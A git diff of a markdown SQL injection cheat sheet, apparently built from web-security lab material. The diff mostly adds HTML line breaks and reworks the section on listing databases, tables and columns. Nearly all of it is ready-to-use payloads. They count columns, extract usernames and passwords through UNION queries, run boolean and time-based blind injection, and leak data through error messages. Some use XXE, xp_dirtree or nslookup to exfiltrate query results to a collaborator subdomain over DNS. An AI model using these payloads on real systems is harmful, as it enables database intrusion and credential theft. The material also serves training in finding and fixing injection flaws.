@@ -1,213 +1,211 @@
-# sqlcheatsheet
-cheatsheet
-# 1. In band or classic sql injection
-1. Error based 2. Union based
-**Error based**
-testing
-Error based sqlinjection
-test ' "
-output(success)
-look for syntax errors
-
-2. **Union based**
-Counting number of columns 2methods 
+# sqlcheatsheet<br/>
+cheatsheet<br/>
+# 1. In band or classic sql injection<br/>
+1. Error based 2. Union based<br/>
+**Error based**<br/>
+testing<br/>
+Error based sqlinjection<br/>
+test ' "<br/>
+output(success)<br/>
+look for syntax errors<br/>
+<br/><br/>
+2. **Union based**<br/>
+Counting number of columns 2methods <br/>
 1. **orderby** (increase the number 1,2,3 so on no error means the number of columns exists if error columns count end ex: ( order by 1--)   --> no error 1columns present, ( order by 2 ) --> no errors 2 columns present, ( order by 3 ) --> error 3 no column present--> so the total columns is 2)
-  ' ORDER BY 1--
-  ' ORDER BY 2--
-  ' ORDER BY 3--
+  ' ORDER BY 1--<br/>
+  ' ORDER BY 2--<br/>
+  ' ORDER BY 3--<br/>
 3. **null based** (go on increasing null values comma separated, at total number of columns no error until you will get errors ex: (' UNION SELECT NULL--) -->error, (' UNION SELECT NULL,NULL--) -->no error--> it means the total number of columns are 2, (' UNION SELECT NULL,NULL,NULL--)-->error)
-  ' UNION SELECT NULL--
-  ' UNION SELECT NULL,NULL--
-  ' UNION SELECT NULL,NULL,NULL--
-NOTE:
-The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.
-On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:
+  ' UNION SELECT NULL--<br/>
+  ' UNION SELECT NULL,NULL--<br/>
+  ' UNION SELECT NULL,NULL,NULL--<br/>
+NOTE:<br/>
+The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.<br/>
+On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:<br/>
 
-' UNION SELECT NULL FROM DUAL--
-The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.
-
-
-# getting database version using null 
-'+UNION+SELECT+@@version,+NULL# (total number of columns is 2 --> inoder to do this first find the no.of columns using previous method it works only mysql,mssql)
+' UNION SELECT NULL FROM DUAL--<br/>
+The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.<br/>
+<br/><br/>
+# getting database version using null <br/>
+'+UNION+SELECT+@@version,+NULL# (total number of columns is 2 --> inoder to do this first find the no.of columns using previous method it works only mysql,mssql)<br/>
 for oracle
+<br/><br/>
+# finding text containing columns<br/>
+Use Burp Suite to intercept and modify the request that sets the product category filter.<br/>
+Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:<br/>
+<br/>
+'+UNION+SELECT+NULL,NULL,NULL--<br/>
+Try replacing each null with the random value provided by the lab, for example:<br/>
+<br/>
+'+UNION+SELECT+'abcdef',NULL,NULL--<br/>
+If an error occurs, move on to the next null and try that instead.<br/>
+<br/><br/>
+# determining number of tables found on the database and their names<br/>
+### Listing Databases on the server<br/>
+``` 1'union+select+null,schema_name,null+FROM+INFORMATION_SCHEMA.SCHEMATA# ``` change the comment based on database to # or -- or /* **and** number of **null** values <br/>
 
-# finding text containing columns
-Use Burp Suite to intercept and modify the request that sets the product category filter.
-Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:
+### Listing Tables inside database from above result <br/>
+``` 1'union+select+null,table_name,null+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema='[database-name]'# ``` change the comment based on database to # or -- or /* **and** replace the database-name **and** number of **null** values <br/>
+**EX:** 1'union+select+null,table_name,null+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema='bankrobber'# <br/>
 
-'+UNION+SELECT+NULL,NULL,NULL--
-Try replacing each null with the random value provided by the lab, for example:
+### Listing columns inside a table from above result <br/>
+``` 1'union+select+null,column_name,null+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='[table-name]'+and+table_schema='[database-name]'# ```  change the comment based on database to # or -- or /* **and** replace the database-name & table-name **and** number of **null** values <br/>
+**EX:**  1'union+select+null,column_name,null+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='users'+and+table_schema='bankrobber'# <br/>
 
-'+UNION+SELECT+'abcdef',NULL,NULL--
-If an error occurs, move on to the next null and try that instead.
+### Listing data from the columns from a perticular database<br/>
+```1'union+select+null,[column-name],null+FROM+[database-name].[table-name]#``` change the comment based on database to # or -- or /* **and** replace the database-name & table-name & column-name **and** number of **null** values <br/>
+**Ex:** 1'union+select+null,username,null+FROM+bankrobber.users# <br/>
 
-# determining number of tables found on the database and their names
-Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
+<br/><br/>
+# 2. Blind or inferential sql injection<br/>
 
-'+UNION+SELECT+'abc','def'--
-Use the following payload to retrieve the list of tables in the database:
+1.Boolean based<br/>
+true or false condition based<br/>
+'or 1=1#<br/>
+2.delay based or time based<br/>
+select sleep(5)<br/>
+<br/><br/>
 
-'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
-Find the name of the table containing user credentials.
-Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
-'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+# cheat sheet commands <br/>
+This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.<br/>
+<br/><br/>
+String concatenation<br/>
+You can concatenate together multiple strings to make a single string.<br/>
+<br/><br/>
+Oracle	'foo'||'bar'<br/>
+Microsoft	'foo'+'bar' <br/>
+PostgreSQL	'foo'||'bar'<br/>
+MySQL	'foo' 'bar' [Note the space between the two strings]<br/>
+CONCAT('foo','bar')<br/>
 
-Find the names of the columns containing usernames and passwords.
-Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
+<br/><br/>
 
-'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
-print values of username and password
+Substring<br/>
+You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.<br/>
+<br/><br/>
+Oracle	SUBSTR('foobar', 4, 2)<br/>
+Microsoft	SUBSTRING('foobar', 4, 2)<br/>
+PostgreSQL	SUBSTRING('foobar', 4, 2)<br/>
+MySQL	SUBSTRING('foobar', 4, 2)<br/>
 
+<br/><br/>
+Comments<br/>
+You can use comments to truncate a query and remove the portion of the original query that follows your input.<br/>
+<br/><br/>
+Oracle	--comment<br/>
+Microsoft	--comment<br/>
+/*comment*/<br/>
+PostgreSQL	--comment<br/>
+/*comment*/<br/>
+MySQL	#comment<br/>
+-- comment [Note the space after the double dash]<br/>
+/*comment*/<br/>
+<br/><br/>
 
-# 2. Blind or inferential sql injection
+Database version<br/>
+You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.<br/>
+<br/><br/>
+Oracle	SELECT banner FROM v$version<br/>
+SELECT version FROM v$instance<br/>
+Microsoft	SELECT @@version<br/>
+PostgreSQL	SELECT version()<br/>
+MySQL	SELECT @@version<br/>
 
-1.Boolean based
-true or false condition based
-'or 1=1#
-2.delay based or time based
-select sleep(5)
+<br/><br/><br/>
 
-
-# cheat sheet commands 
-This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.
-
-String concatenation
-You can concatenate together multiple strings to make a single string.
-
-Oracle	'foo'||'bar'
-Microsoft	'foo'+'bar'
-PostgreSQL	'foo'||'bar'
-MySQL	'foo' 'bar' [Note the space between the two strings]
-CONCAT('foo','bar')
-
-
-
-Substring
-You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.
-
-Oracle	SUBSTR('foobar', 4, 2)
-Microsoft	SUBSTRING('foobar', 4, 2)
-PostgreSQL	SUBSTRING('foobar', 4, 2)
-MySQL	SUBSTRING('foobar', 4, 2)
-
-
-Comments
-You can use comments to truncate a query and remove the portion of the original query that follows your input.
-
-Oracle	--comment
-Microsoft	--comment
-/*comment*/
-PostgreSQL	--comment
-/*comment*/
-MySQL	#comment
--- comment [Note the space after the double dash]
-/*comment*/
-
-
-Database version
-You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
-
-Oracle	SELECT banner FROM v$version
-SELECT version FROM v$instance
-Microsoft	SELECT @@version
-PostgreSQL	SELECT version()
-MySQL	SELECT @@version
-
-
-
-Database contents
-You can list the tables that exist in the database, and the columns that those tables contain.
-
-Oracle	SELECT * FROM all_tables
-SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
-Microsoft	SELECT * FROM information_schema.tables
-SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
-PostgreSQL	SELECT * FROM information_schema.tables
-SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
-MySQL	SELECT * FROM information_schema.tables
-SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
-Conditional errors
-You can test a single boolean condition and trigger a database error if the condition is true.
-
-Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
-Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
-PostgreSQL	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
-MySQL	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
-Extracting data via visible error messages
-You can potentially elicit error messages that leak sensitive data returned by your malicious query.
-
-Microsoft	SELECT 'foo' WHERE 1 = (SELECT 'secret')
-
-> Conversion failed when converting the varchar value 'secret' to data type int.
-PostgreSQL	SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
-
-> invalid input syntax for integer: "secret"
-MySQL	SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
-
-> XPATH syntax error: '\secret'
-Batched (or stacked) queries
-You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
-
-Oracle	Does not support batched queries.
-Microsoft	QUERY-1-HERE; QUERY-2-HERE
-PostgreSQL	QUERY-1-HERE; QUERY-2-HERE
-MySQL	QUERY-1-HERE; QUERY-2-HERE
-Note
-With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
-
-
-
-Time delays
-You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
-
-Oracle	dbms_pipe.receive_message(('a'),10)
-Microsoft	WAITFOR DELAY '0:0:10'
-PostgreSQL	SELECT pg_sleep(10)
-MySQL	SELECT SLEEP(10)
+Database contents<br/>
+You can list the tables that exist in the database, and the columns that those tables contain.<br/>
+<br/><br/>
+Oracle	SELECT * FROM all_tables<br/>
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'<br/>
+Microsoft	SELECT * FROM information_schema.tables<br/>
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br/>
+PostgreSQL	SELECT * FROM information_schema.tables<br/>
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br/>
+MySQL	SELECT * FROM information_schema.tables<br/>
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br/>
+Conditional errors<br/>
+You can test a single boolean condition and trigger a database error if the condition is true.<br/>
+<br/><br/>
+Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual<br/>
+Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END<br/>
+PostgreSQL	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)<br/>
+MySQL	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')<br/>
+Extracting data via visible error messages<br/>
+You can potentially elicit error messages that leak sensitive data returned by your malicious query.<br/>
+<br/><br/>
+Microsoft	SELECT 'foo' WHERE 1 = (SELECT 'secret')<br/>
+<br/><br/>
+> Conversion failed when converting the varchar value 'secret' to data type int.<br/>
+PostgreSQL	SELECT CAST((SELECT password FROM users LIMIT 1) AS int)<br/>
+<br/><br/>
+> invalid input syntax for integer: "secret"<br/>
+MySQL	SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))<br/>
+<br/><br/>
+> XPATH syntax error: '\secret'<br/>
+Batched (or stacked) queries<br/>
+You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.<br/>
+<br/><br/>
+Oracle	Does not support batched queries.<br/>
+Microsoft	QUERY-1-HERE; QUERY-2-HERE<br/>
+PostgreSQL	QUERY-1-HERE; QUERY-2-HERE<br/>
+MySQL	QUERY-1-HERE; QUERY-2-HERE<br/>
+Note<br/>
+With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.<br/>
+<br/><br/><br/>
 
 
-Conditional time delays
-You can test a single boolean condition and trigger a time delay if the condition is true.
+Time delays<br/>
+You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.<br/>
+<br/><br/><br/>
+Oracle	dbms_pipe.receive_message(('a'),10)<br/>
+Microsoft	WAITFOR DELAY '0:0:10'<br/>
+PostgreSQL	SELECT pg_sleep(10)<br/>
+MySQL	SELECT SLEEP(10)<br/>
 
-Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
-Microsoft	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
-PostgreSQL	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
-MySQL	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+<br/><br/><br/>
+Conditional time delays<br/>
+You can test a single boolean condition and trigger a time delay if the condition is true.<br/>
 
+Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual<br/>
+Microsoft	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'<br/>
+PostgreSQL	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END<br/>
+MySQL	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')<br/>
 
+<br/><br/><br/>
 
-DNS lookup
-You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
-
-Oracle	
-(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
-
-SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
-The following technique works on fully patched Oracle installations, but requires elevated privileges:
-
-SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
-Microsoft	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
-PostgreSQL	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
-MySQL	
-The following techniques work on Windows only:
-
-LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
-SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
-DNS lookup with data exfiltration
-You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
-
-Oracle	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
-Microsoft	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
-PostgreSQL	create OR replace function f() returns void as $$
-declare c text;
-declare p text;
-begin
-SELECT into p (SELECT YOUR-QUERY-HERE);
-c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
-execute c;
-END;
-$$ language plpgsql security definer;
-SELECT f();
-MySQL	The following technique works on Windows only:
-SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+DNS lookup<br/>
+You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.<br/>
+<br/><br/>
+Oracle	<br/>
+(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br/>
+<br/><br/>
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual<br/>
+The following technique works on fully patched Oracle installations, but requires elevated privileges:<br/>
+<br/><br/>
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')<br/>
+Microsoft	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'<br/>
+PostgreSQL	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'<br/>
+MySQL	<br/>
+The following techniques work on Windows only:<br/>
+<br/><br/>
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')<br/>
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'<br/>
+DNS lookup with data exfiltration<br/>
+You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.<br/>
+<br/><br/>
+Oracle	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual<br/>
+Microsoft	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')<br/>
+PostgreSQL	create OR replace function f() returns void as $$<br/>
+declare c text;<br/>
+declare p text;<br/>
+begin<br/>
+SELECT into p (SELECT YOUR-QUERY-HERE);<br/>
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';<br/>
+execute c;<br/>
+END;<br/>
+$$ language plpgsql security definer;<br/>
+SELECT f();<br/>
+MySQL	The following technique works on Windows only:<br/>
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'<br/>
 
